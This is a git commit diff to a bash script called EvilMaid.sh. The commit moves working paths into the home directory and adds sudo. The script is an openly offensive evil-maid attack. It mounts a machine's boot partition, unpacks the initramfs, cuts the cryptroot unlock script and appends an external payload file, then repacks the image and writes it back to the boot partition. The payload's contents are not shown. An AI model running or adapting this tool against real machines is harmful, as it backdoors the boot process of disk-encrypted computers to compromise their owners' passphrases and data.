6922636a61d6c4cc2839ec63028929144a8d1667
Diego Velásquez <diesveca@outlook.com>
2022-08-09 16:57:21 -0500

    Change to no sudo

--- Evil-Maid/EvilMaid.sh
+++ Evil-Maid/EvilMaid.sh
@@ -1,19 +1,18 @@
-#!/bin/bash
+#!/usr/bin/env bash
 wdir=$(pwd)
-apt install dracut-core -y
-mkdir /target
-mount -t ext4 /dev/sda1 /target
-initrd=$(ls /target | grep initrd.img)
-mkdir /out
-cd /out
-echo $initrd
-lsinitrd --unpack /target/$initrd
+sudo apt install dracut-core -y
+mkdir ~/target
+mount -t ext4 /dev/sda1 ~/target
+initrd=$(ls ~/target | grep initrd.img)
+mkdir ~/out
+cd ~/out
+lsinitrd --unpack ~/target/$initrd
 cd scripts/local-top
 head -n -2 cryptroot > cryptroot2 && cat $wdir/payload.txt >> cryptroot2
 mv cryptroot2 cryptroot
-cd /out
-find . | cpio -H newc -o | gzip -9 > /$initrd
-mv /$initrd /target/$initrd
-umount /target
+cd ~/out
+find . | cpio -H newc -o | gzip -9 > ~/$initrd
+mv ~/$initrd ~/target/$initrd
+umount ~/target
 echo "Evil Maid Completed"
-exit 0;
+exit 0
